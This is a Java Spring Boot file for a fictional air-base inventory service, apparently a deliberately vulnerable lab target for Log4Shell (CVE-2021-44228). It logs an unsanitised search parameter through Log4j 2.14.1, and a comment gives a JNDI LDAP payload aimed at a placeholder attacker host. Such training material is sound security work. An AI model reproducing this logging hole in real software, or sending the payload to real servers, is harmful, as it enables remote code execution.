package com.hafb.inventory;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

import java.util.*;

/**
 * HAFB Inventory Service
 * ⚠️ INTENTIONALLY VULNERABLE — Uses Log4j 2.14.1 (CVE-2021-44228)
 *
 * Vulnerability: The search query parameter is logged directly using Log4j.
 * A JNDI payload in the search field triggers remote code execution.
 */
@SpringBootApplication
@RestController
public class InventoryServiceApplication {

    // ⚠️ Vulnerable logger — Log4j 2.14.1
    private static final Logger logger = LogManager.getLogger(InventoryServiceApplication.class);

    // Simulated inventory data
    private static final List<Map<String, String>> INVENTORY = Arrays.asList(
        createItem("F-35A", "Fighter", "operational"),
        createItem("F-16", "Fighter", "maintenance"),
        createItem("C-130", "Transport", "operational"),
        createItem("A-10", "Attack", "operational"),
        createItem("KC-135", "Tanker", "operational")
    );

    private static Map<String, String> createItem(String name, String type, String status) {
        Map<String, String> item = new HashMap<>();
        item.put("name", name);
        item.put("type", type);
        item.put("status", status);
        return item;
    }

    public static void main(String[] args) {
        SpringApplication.run(InventoryServiceApplication.class, args);
    }

    @GetMapping("/")
    public ResponseEntity<Map<String, Object>> index() {
        Map<String, Object> response = new HashMap<>();
        response.put("service", "HAFB Inventory Service");
        response.put("status", "running");
        response.put("version", "1.0.0");
        return ResponseEntity.ok(response);
    }

    @GetMapping("/health")
    public ResponseEntity<Map<String, String>> health() {
        Map<String, String> response = new HashMap<>();
        response.put("status", "UP");
        return ResponseEntity.ok(response);
    }

    /**
     * Search endpoint — logs the search query directly.
     * ⚠️ VULNERABLE: query param is passed to logger.info() without sanitization.
     * Payload: GET /search?q=${jndi:ldap://attacker-ip:1389/exploit}
     */
    @GetMapping("/search")
    public ResponseEntity<Map<String, Object>> search(@RequestParam(defaultValue = "") String q) {

        // ⚠️ THIS LINE IS VULNERABLE — Log4j processes JNDI lookups in logged strings
        logger.info("Inventory search query: {}", q);

        List<Map<String, String>> results = new ArrayList<>();
        for (Map<String, String> item : INVENTORY) {
            if (q.isEmpty() || item.get("name").toLowerCase().contains(q.toLowerCase())) {
                results.add(item);
            }
        }

        Map<String, Object> response = new HashMap<>();
        response.put("query", q);
        response.put("results", results);
        response.put("count", results.size());
        return ResponseEntity.ok(response);
    }

    @GetMapping("/items")
    public ResponseEntity<Map<String, Object>> items() {
        Map<String, Object> response = new HashMap<>();
        response.put("items", INVENTORY);
        response.put("count", INVENTORY.size());
        return ResponseEntity.ok(response);
    }
}